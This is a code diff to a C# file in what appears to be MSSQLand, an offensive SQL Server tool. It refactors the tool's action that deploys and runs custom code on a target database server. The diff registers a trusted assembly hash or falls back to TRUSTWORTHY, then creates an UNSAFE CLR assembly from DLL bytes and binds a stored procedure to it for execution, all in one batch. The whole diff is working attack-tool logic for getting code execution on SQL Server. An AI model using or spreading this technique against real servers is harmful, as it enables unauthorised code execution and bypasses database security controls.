@@ -72,14 +72,12 @@ namespace MSSQLand.Actions.Execution
                 // Strategy 2: Fall back to TRUSTWORTHY property (requires db_owner on a trustworthy-eligible database)
                 if (!databaseContext.QueryService.ExecutionServer.IsLegacy)
                 {
-                    string assemblyDescription = $"{ByteHelper.GetRandomIdentifier(6)}, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil";
-                    usedTrustedAssembly = databaseContext.ConfigService.RegisterTrustedAssembly(libraryHash, assemblyDescription);
+                    usedTrustedAssembly = databaseContext.ConfigService.PrepareForTrustedAssembly(libraryHash);
                 }
 
                 if (!usedTrustedAssembly)
                 {
                     Logger.Warning("Trusted assembly registration unavailable, falling back to TRUSTWORTHY");
-                    // Check if database is already TRUSTWORTHY
                     object trustworthyResult = databaseContext.QueryService.ExecuteScalar(
                         $"SELECT is_trustworthy_on FROM sys.databases WHERE name = DB_NAME();");
 
@@ -108,16 +106,26 @@ namespace MSSQLand.Actions.Execution
                     }
                 }
 
-                // Drop existing procedure and assembly if they exist
-                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
-                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
+                // Build and execute a single batch: sp_add_trusted_assembly (if needed) +
+                // drop/create assembly + create procedure. Running these together in one
+                // ExecuteNonProcessing call ensures they land in the same remote connection,
+                // which avoids the distributed-transaction visibility issue where CREATE ASSEMBLY
+                // would not see the trusted assembly entry added in a prior call.
+                Logger.TaskNested("Deploying assembly and stored procedure");
 
-                // Step 3: Create the assembly from the DLL bytes, retrying once on MVID conflict
-                Logger.TaskNested("Creating the assembly from DLL bytes");
+                string assemblyDescription = $"{ByteHelper.GetRandomIdentifier(6)}, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil";
+                string addTrustedQuery = usedTrustedAssembly
+                    ? ConfigurationService.GetTrustedAssemblyQuery(libraryHash, assemblyDescription) + "\n"
+                    : string.Empty;
+
                 try
                 {
                     databaseContext.QueryService.ExecuteNonProcessing(
-                        $"CREATE ASSEMBLY [{assemblyName}] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE;");
+                        $"{addTrustedQuery}" +
+                        $"DROP PROCEDURE IF EXISTS [{_function}];\n" +
+                        $"DROP ASSEMBLY IF EXISTS [{assemblyName}];\n" +
+                        $"CREATE ASSEMBLY [{assemblyName}] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE;\n" +
+                        $"CREATE PROCEDURE [dbo].[{_function}] @args NVARCHAR(MAX) AS EXTERNAL NAME [{assemblyName}].[{_className}].[{_function}];");
                 }
                 catch (Exception createErr)
                 {
@@ -127,7 +135,10 @@ namespace MSSQLand.Actions.Execution
                         Logger.Warning($"Dropping conflicting leftover assembly '{conflicting}' (MVID collision)");
                         databaseContext.QueryService.ExecuteNonProcessing($"DROP ASSEMBLY IF EXISTS [{conflicting}];");
                         databaseContext.QueryService.ExecuteNonProcessing(
-                            $"CREATE ASSEMBLY [{assemblyName}] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE;");
+                            $"{addTrustedQuery}" +
+                            $"DROP ASSEMBLY IF EXISTS [{assemblyName}];\n" +
+                            $"CREATE ASSEMBLY [{assemblyName}] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE;\n" +
+                            $"CREATE PROCEDURE [dbo].[{_function}] @args NVARCHAR(MAX) AS EXTERNAL NAME [{assemblyName}].[{_className}].[{_function}];");
                     }
                     else
                     {
@@ -135,13 +146,7 @@ namespace MSSQLand.Actions.Execution
                     }
                 }
 
-                Logger.Success($"Assembly '{assemblyName}' created");
-
-                Logger.TaskNested("Creating the stored procedure linked to the assembly");
-                databaseContext.QueryService.ExecuteNonProcessing(
-                    $"CREATE PROCEDURE [dbo].[{_function}] @args NVARCHAR(MAX) AS EXTERNAL NAME [{assemblyName}].[{_className}].[{_function}];");
-
-                Logger.Success($"Stored procedure '{_function}' created");
+                Logger.Success($"Assembly '{assemblyName}' and procedure '{_function}' deployed");
 
                 // Step 5: Execute the stored procedure
                 Logger.TaskNested($"Executing the stored procedure '{_function}'");
